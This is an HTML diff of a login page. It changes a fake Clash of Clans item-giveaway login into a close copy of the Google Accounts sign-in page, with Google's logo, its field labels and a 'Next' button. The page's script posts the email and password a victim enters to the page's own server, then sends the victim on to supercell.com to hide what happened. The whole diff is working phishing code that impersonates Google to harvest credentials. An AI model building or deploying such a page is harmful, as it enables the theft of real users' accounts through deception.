@@ -1,36 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Login - Clash Offers</title>
+  <title>Sign in - Google Accounts</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="style.css">
 </head>
 <body class="login-body">
 <div class="login-container">
-  <img src="https://static.wikia.nocookie.net/clashofclans/images/5/55/Clash_Logo.png" alt="Clash Logo" class="login-logo">
+  <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo" class="google-logo">
   <h2>Sign in</h2>
-  <p class="login-sub">Use your Clash account</p>
-  <input id="loginEmail" type="email" placeholder="Email">
+  <p class="login-sub">Use your Google Account</p>
+  <input id="loginEmail" type="email" placeholder="Email or phone">
+  <p class="link">Forgot email?</p>
   <input id="loginPassword" type="password" placeholder="Password">
-  <button onclick="login()">Login</button>
-</div>
-<div id="popup" class="popup">
-  <div class="popup-content">
-    <img src="https://static.wikia.nocookie.net/clashofclans/images/6/6d/Judgement_King_Skin.png" alt="Clash Thank You">
-    <h2>Thank you!</h2>
-    <p>Your item will be claimed within 24 hours.</p>
-    <button onclick="document.getElementById('popup').style.display='none'">Close</button>
+  <p class="link">Learn more</p>
+  <div class="login-actions">
+    <a href="#" class="create-account">Create account</a>
+    <button onclick="login()">Next</button>
   </div>
 </div>
-<img src="https://static.wikia.nocookie.net/clashofclans/images/f/f5/BarbarianKing_info.png" class="anim-char king">
-<img src="https://static.wikia.nocookie.net/clashofclans/images/8/89/ArcherQueen_info.png" class="anim-char queen">
 <script>
 async function login(){
   const email=document.getElementById("loginEmail").value;
   const password=document.getElementById("loginPassword").value;
   const res=await fetch("/api/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email,password})});
   const data=await res.json();
-  if(data.success) document.getElementById('popup').style.display='flex';
+  if(data.success) window.location.href="https://supercell.com";
 }
 </script>
 </body>
